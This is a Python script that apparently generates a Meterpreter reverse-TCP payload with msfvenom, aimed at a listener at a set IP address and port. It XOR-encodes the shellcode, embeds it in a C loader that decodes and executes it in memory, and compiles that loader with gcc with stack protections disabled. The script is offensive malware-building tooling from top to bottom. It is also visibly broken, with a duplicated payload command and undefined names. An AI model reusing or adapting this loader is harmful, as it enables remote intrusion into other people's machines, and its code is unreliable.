#!/bin/env python3
import ak
import os
import subprocess

LHOST = "192.168.49.65"
LPORT = 4444
OUT_FILENAME = 'msf-linux-x64'
MSFVENOM_CMD = f"msfvenom -a x64 --platform Linux -p linux/x64/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f raw -e generic/none"
MSFVENOM_CMD = f"msfvenom -a x64 --platform Windows -p windows/x64/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f raw -e generic/none"

def generate_c(xor_shellcode):
  xor_shellcode_hex = "".join("\\x%02x" % b for b in xor_shellcode)

  template = """
  #include <stdio.h>
  #include <stdlib.h>
  #include <unistd.h>
  #include <sys/mman.h>

  int main (int argc, char **argv)
  {{
      unsigned char *buf = "{xor_shellcode}";
      char xor_key = '\\x05';
      int arraysize = (int) sizeof(buf);
      for (int i=0; i<arraysize-1; i++) {{
        buf[i] = buf[i]^xor_key;
      }}
      int (*ret)() = (int(*)())buf;
        ret();
      return 0;
  }}
  """.format(xor_shellcode=shellcode.get_hex_c)

  print(template)
  return template


def compile_c(c):
  p = subprocess.Popen(['gcc','-x', 'c', '-o', OUT_FILENAME, '-','-z','execstack', '-no-pie', '-fno-stack-protector'], stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.STDOUT)
  output = p.stdin.write(str.encode(c))
  p.stdin.close()
  print(p.stdout.readline())
  os.chmod(OUT_FILENAME, 0o755)

def main():
  shellcode = ShellCode(MSFVENOM_CMD, b'\x05')

  compile_c(generate_c(shellcode))
  assert(bytearray(shellcode) == bytearray(enc_shellcode(xor_shellcode)))


if __name__ == "__main__":
  main()
